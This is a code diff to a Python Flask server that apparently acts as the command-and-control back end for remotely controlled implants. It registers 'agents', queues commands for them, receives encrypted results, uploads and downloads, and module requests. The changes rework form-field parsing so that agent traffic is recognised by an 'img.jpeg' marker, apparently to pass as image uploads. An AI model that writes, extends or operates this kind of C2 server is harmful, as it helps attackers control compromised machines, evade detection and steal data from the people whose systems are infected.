@@ -148,13 +148,22 @@ def payloadjfs():
 @app.route(register_url, methods=["POST"])
 def info():
     global COUNT
-    data = request.form['data']
-    #id= request.form['image']
-    for i in request.form:
+    #print(request.form)
+    #data = request.form['data']
+    """for i in request.form:
         if i=='data' :
             continue
         else:
-            id=request.form[i]
+            id=request.form[i]"""
+    args=[]
+    for i in request.form:
+        args.append(i)
+    if request.form[args[1]].find("img.jpeg")>-1:
+        id=request.form[args[1]]
+        data=request.form[args[0]]
+    else:
+        data =request.form[args[1]]
+        id=request.form[args[0]]
     #request.args.get('page')
     if AGENTS.get(id) == None and data != None:
         data = data.split('**')
@@ -178,6 +187,12 @@ def info():
 @app.route(upload_url, methods=["POST"])
 def upload():
     try:
+        args=[]
+        for i in request.form:
+            args.append(i)
+        #name=request.form[args[1]]
+        #id =request.form[args[0]]
+        ########
         #name = name.decode('base64').replace('\n', '')
         #name=request.args.get('page')
         name=request.form['file']
@@ -262,7 +277,14 @@ def sct(request):
 
 @app.route(download_url, methods=["POST"])
 def download():
-    data = request.form['d']
+    args=[]
+    for i in request.form:
+        args.append(i)
+    #filename=request.form[args[0]]
+    #filecontent =request.form[args[1]]
+    #id =request.form[args[2]]
+    ################
+    #data = request.form['d']
     id= request.form['resource']
     #print(id)
     #print(data)
@@ -281,8 +303,20 @@ def download():
 
 @app.route(image_url, methods=["POST"])
 def image():
-    id= request.form['resource']
-    data = request.form['data']
+    args=[]
+    for i in request.form:
+        args.append(i)
+
+    if request.form[args[1]].find("img.jpeg")>-1:
+        id=request.form[args[1]]
+        data=request.form[args[0]]
+    else:
+        data =request.form[args[1]]
+        id=request.form[args[0]]
+    #id=request.form[args[1]]#request.form['resource']
+    #data =request.form[args[0]] #request.form['data']
+    #id= request.form['resource']
+    #data = request.form['data']
     fn=id+''.join(random.choice(string.ascii_lowercase) for i in range(5))
     if AGENTS.get(id) != None and data != None:
         data = decrypt_file(AESKey,data.strip().replace(" ","+").split(":")[1].split(":")[0])
@@ -296,8 +330,19 @@ def image():
 
 @app.route(command_url, methods=["POST"])
 def command():
+    args=[]
     #id= request.args.get('page')
-    id=request.form['resource']
+    for i in request.form:
+        args.append(i)
+    #id=request.form[args[0]]#request.form['resource']
+    if request.form[args[0]].find("img.jpeg")>-1:
+        id=request.form[args[0]]
+    else:
+        id=request.form[args[1]]
+    #data =request.form[args[1]] #request.form['data']
+    #id=request.form['resource']
+    #print(request.form)
+
     if AGENTS.get(id) != None:
         TIME[id] = time.time()
     if AGENTS.get(id) != None and len(COMMAND.get(id)) > 0:
@@ -320,10 +365,20 @@ def command():
 
 @app.route(result_url, methods=["POST","GET"])
 def result():
+    args=[]
+    #print(request.form)
     #id= request.args.get('page')
-    id=request.form['resource']
-    data = request.form['data']
+    for i in request.form:
+        args.append(i)
+    #id=request.form[args[0]]#request.form['resource']
+    #data =request.form[args[1]] #request.form['data']
     #print id,data
+    if request.form[args[1]].find("img.jpeg")>-1:
+        id=request.form[args[1]]
+        data=request.form[args[0]]
+    else:
+        data =request.form[args[1]]
+        id=request.form[args[0]]
     if AGENTS.get(id) != None and data != None:
         #data = data.decode('base64')
         data = decrypt(AESKey,data.replace(" ","+"))
@@ -368,9 +423,22 @@ def result():
 @app.route(modules_url, methods=["POST"])
 def modules():
     #id= request.args.get('page')
-    id=request.form['resource']
-    data = request.form['data']
-    b64=request.form["b"]
+    args=[]
+    for i in request.form:
+        args.append(i)
+    #print(args)
+    #print(args[0])
+    #print(request.form[args[0]])
+    if request.form[args[1]].find("img.jpeg")>-1:
+        id=request.form[args[1]]
+        data=request.form[args[0]]
+    else:
+        data =request.form[args[1]]
+        id=request.form[args[0]]
+    #id=request.form[args[0]]#request.form['resource']
+    #data =request.form[args[1]]# request.form['data']
+    #b64=request.form[args[2]]#request.form["b"]
+    b64=0
     if AGENTS.get(id) != None and data != None:
         data=decrypt(AESKey,data.replace(" ","+")).replace('\00', '')
         p_out = '[+] New Agent Request Module %s (%s - %s)' % (data, AGENTS[id][0], AGENTS[id][7])
